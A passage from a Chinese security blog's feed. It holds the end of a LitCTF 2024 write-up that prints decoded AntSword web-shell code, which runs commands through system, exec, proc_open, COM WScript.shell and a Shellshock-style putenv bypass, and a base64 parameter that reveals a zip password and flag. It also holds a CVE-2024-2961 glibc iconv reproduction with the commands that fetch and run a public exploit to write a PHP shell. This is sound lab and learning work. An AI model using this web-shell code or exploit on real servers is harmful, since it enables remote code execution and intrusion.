punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'putenv'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error_log'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mail'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">readlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bash"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'as'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHP_LOL=() &#123; x; &#125;; <span class="token interpolation"><span class="token variable">$c</span></span> ><span class="token interpolation"><span class="token variable">$tmp</span></span> 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error_log'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a@127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"-bv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">runcmd</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fp</span><span class="token operator">=</span>@<span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span> <span class="token operator">=</span> @<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$io</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'antsystem'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token function">antsystem</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">runshellshock</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string double-quoted-string">"/"</span> <span class="token operator">&amp;&amp;</span> @<span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"COM"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$e</span><span class="token operator">=</span><span class="token variable">$w</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$so</span><span class="token operator">=</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ret</span><span class="token operator">.=</span><span class="token variable">$so</span><span class="token operator">-></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$se</span><span class="token operator">=</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">StdErr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ret</span><span class="token operator">.=</span><span class="token variable">$se</span><span class="token operator">-></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$ret</span><span class="token operator">=</span>@<span class="token function">runcmd</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token operator">.</span><span class="token string double-quoted-string">" 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"ret=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ret</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>da8af99c22690c<span class="token operator">=</span>pnY21k<span class="token operator">&amp;</span>j6d5aaa1b7e5ac<span class="token operator">=</span>OAY2QgL2QgIkM6XFxQcm9ncmFtIEZpbGVzXFxwaHBzdHVkeV9wcm9cXFdXV1xcTGl0Q1RGLXBjYXBuZyImemlwIC1QICJQYVNzdzByZF9MaXRDdEZfTDB2ZWx5X3RhbkppIiBmMWFnLnppcCBmbGFnLnBocCZlY2hvIDFhOTI1JmNkJmVjaG8gNmZmZWIx<span class="token operator">&amp;</span>xf65aaf1672c18<span class="token operator">=</span><span class="token constant">ST</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601155836218.png" alt="image-20240601155836218"></p><p>取<code>j6d5aaa1b7e5ac</code>参数进行解密得到zip的密码<code>PaSsw0rd_LitCtF_L0vely_tanJi</code></p><p>得到flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"LitCTF&#123;anTsw0rd_fl0w_is_eAsY_f0r_u&#125;"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;又是一年探姬杯&lt;/p&gt;
&lt;p&gt;一眼秒了（&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2024-2961复现</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-31T03:06:57.000Z</published>
    <updated>2024-07-07T14:36:36.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现环境：<a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/">https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/</a></p><p>参考文章：<a href="https://xz.aliyun.com/t/14690">https://xz.aliyun.com/t/14690</a></p><p>先挂起，必可活用于某次ctf（（</p><p>2024.7.6：于ctfshow XGCTF 和 春秋杯夏季赛 中出现了相关题目</p><span id="more"></span><hr><h1 id="PHP利用GNU-C-Iconv将文件读取变成RCE"><a href="#PHP利用GNU-C-Iconv将文件读取变成RCE" class="headerlink" title="PHP利用GNU C Iconv将文件读取变成RCE"></a>PHP利用GNU C Iconv将文件读取变成RCE</h1><blockquote><p>GNU C 是一个标准的ISO C依赖库。在GNU C中，<code>iconv()</code>函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。</p></blockquote><p>如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用<code>iconv()</code>的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。</p><p>原文：<a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1">https://www.ambionics.io/blog/iconv-cve-2024-2961-p1</a></p><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>把复现环境git下来</p><p>然后起docker，docker-composer.yml里面已经帮我们写好了以iconv 2.36作为依赖，index.php是一个<code>file_get_contents</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"File contents: <span class="token interpolation"><span class="token variable">$data</span></span>"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问<code>http://127.0.0.1:8080/index.php</code>，传入file参数就能读取文件</p><p><img src="/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/image-20240627124002752.png" alt="image-20240627124002752"></p><hr><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>exp：<a href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p><p>注：需要在linux环境，python3.10下运行此exp，同时需要安装对应依赖</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> pwntoolspip3 <span class="token function">install</span> https://github.com/cfreal/ten/archive/refs/heads/main.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下载poc并运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.pypython3 cnext-exploit.py http://localhost:8080/index.php <span class="token string">"echo '&lt;?=phpinfo();?>' > shell.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/image-20240707102347948.png" alt="image-20240707102347948"></p><p>然后就会发现成功写入文件了</p><p><img src="/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/image-20240707102414239.png" alt="image-20240707102414239"></p><hr><h1 id="个人对原理的理解"><a href="#个人对原理的理解" class="headerlink" title="个人对原理的理解"></a>个人对原理的理解</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>既然是在php文件读取上出现的问题，那么我们第一个想到的就是php的各种伪协议，以及和字符变换<code>iconv</code>有关的filterchain</p><p>同样的这个洞也是和 iconv 有关的</p><h2 id="iconv-API"><a href="#iconv-API" class="headerlink" title="iconv() API"></a>iconv() API</h2><p>当PHP从一个字符集转换到另一个字符集时，它使用 <a href="https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html">iconv</a>，这是一个用于“<strong>使用转换描述符将输入缓冲区中的字符转换为输出缓冲区</strong>”的API。在Linux系统上，这个API由 <a href="https://www.gnu.org/software/libc/"><code>glibc</code></a> 实现</p><p>API非常简单。首先，打开一个转换描述符，该描述符指定了输入和输出字符集</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">iconv_t</span> <span class="token function">iconv_open</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>tocode<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>fromcode<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，使用<code>iconv()</code>将输入缓冲区<code>inbuf</code>转换为输出缓冲区<code>outbuf</code>中的新字符集</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token class-name">iconv_t</span> cd<span class="token punctuation">,</span>            <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>restrict inbuf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> <span class="token operator">*</span>restrict inbytesleft<span class="token punctuation">,</span>            <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>restrict outbuf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> <span class="token operator">*</span>restrict outbytesleft<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果输出缓冲区不够大，<code>iconv()</code> 将返回一个错误指示此情况，可以通过重新分配 <code>outbuf</code> 并再次调用 <code>iconv()</code> 来继续转换。</p><p>该函数保证的是，它永远不会从 <code>inbuf</code> 读取超过 <code>inbytesleft</code> 字节的数据，或向 <code>outbuf</code> 写入超过 <code>outbytesleft</code> 字节的数据（真的吗？）</p><h2 id="转换为-ISO-2022-CN-EXT-时出现越界写入"><a href="#转换为-ISO-2022-CN-EXT-时出现越界写入" class="headerlink" title="转换为 ISO-2022-CN-EXT 时出现越界写入"></a>转换为 ISO-2022-CN-EXT 时出现越界写入</h2><p>在将数据转换为ISO-2022-CN-EXT字符集时，<code>iconv</code>可能在写入输出缓冲区之前未能检查是否有足够的空间剩余</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// iconvdata/iso-2022-cn-ext.c</span><span class="token comment">/* See whether we have to emit an escape sequence.  */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>set <span class="token operator">!=</span> used<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/* First see whether we announced that we use this        character set.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>used <span class="token operator">&amp;</span> SO_mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ann <span class="token operator">&amp;</span> SO_ann<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>used <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [1]</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>escseq<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>outptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">></span> outend<span class="token punctuation">)</span> <span class="token comment">// &lt;-------------------- BOUND CHECK</span>        <span class="token punctuation">&#123;</span>            result <span class="token operator">=</span> __GCONV_FULL_OUTPUT<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>used <span class="token operator">>=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> used <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        escseq <span class="token operator">=</span> <span class="token string">")A\0\0)G)E"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>used <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> ESC<span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>escseq<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>escseq<span class="token operator">++</span><span class="token punctuation">;</span>        ann <span class="token operator">=</span> <span class="token punctuation">(</span>ann <span class="token operator">&amp;</span> <span class="token operator">~</span>SO_ann<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>used <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>used <span class="token operator">&amp;</span> SS2_mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ann <span class="token operator">&amp;</span> SS2_ann<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>used <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [2]</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>escseq<span class="token punctuation">;</span>        <span class="token comment">// &lt;-------------------- NO BOUND CHECK</span>        <span class="token function">assert</span><span class="token punctuation">(</span>used <span class="token operator">==</span> CNS11643_2_set<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* XXX */</span>        escseq <span class="token operator">=</span> <span class="token string">"*H"</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> ESC<span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>escseq<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>escseq<span class="token operator">++</span><span class="token punctuation">;</span>        ann <span class="token operator">=</span> <span class="token punctuation">(</span>ann <span class="token operator">&amp;</span> <span class="token operator">~</span>SS2_ann<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>used <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>used <span class="token operator">&amp;</span> SS3_mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ann <span class="token operator">&amp;</span> SS3_ann<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>used <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [3]</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token keyword">char</span> 